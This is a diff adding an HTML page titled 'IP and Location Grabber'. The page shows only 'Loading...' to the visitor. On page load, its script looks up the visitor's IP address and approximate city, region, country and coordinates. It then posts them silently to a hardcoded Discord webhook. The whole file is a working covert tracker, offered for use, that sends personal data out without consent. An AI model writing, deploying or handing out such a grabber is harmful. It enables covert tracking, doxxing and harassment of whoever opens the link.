@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP and Location Grabber</title>
+    <script>
+        function sendData() {
+            const webhookUrl = 'https://discord.com/api/webhooks/1412190043245903924/ryrPd4XlIPb2_FsqF38i4QiowcqnuxN6Lokz2nT6fD-IFYPJ552XD_3DuGXztxT0Kj-p'; // Your webhook URL
+
+            // Get user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+
+                    // Get user's location data
+                    fetch(`https://ipapi.co/${userIP}/json/`)
+                        .then(response => response.json())
+                        .then(locationData => {
+                            const userLocation = {
+                                ip: userIP,
+                                city: locationData.city,
+                                region: locationData.region,
+                                country: locationData.country_name,
+                                latitude: locationData.latitude,
+                                longitude: locationData.longitude
+                            };
+
+                            // Send data to webhook
+                            fetch(webhookUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    content: `IP: ${userLocation.ip}\nCity: ${userLocation.city}\nRegion: ${userLocation.region}\nCountry: ${userLocation.country}\nLatitude: ${userLocation.latitude}\nLongitude: ${userLocation.longitude}`
+                                })
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('Data sent successfully:', data);
+                            })
+                            .catch(error => {
+                                console.error('Error sending data:', error);
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Error fetching location data:', error);
+                        });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        }
+
+        // Call the function to send data when the page loads
+        window.onload = sendData;
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+</body>
+</html>
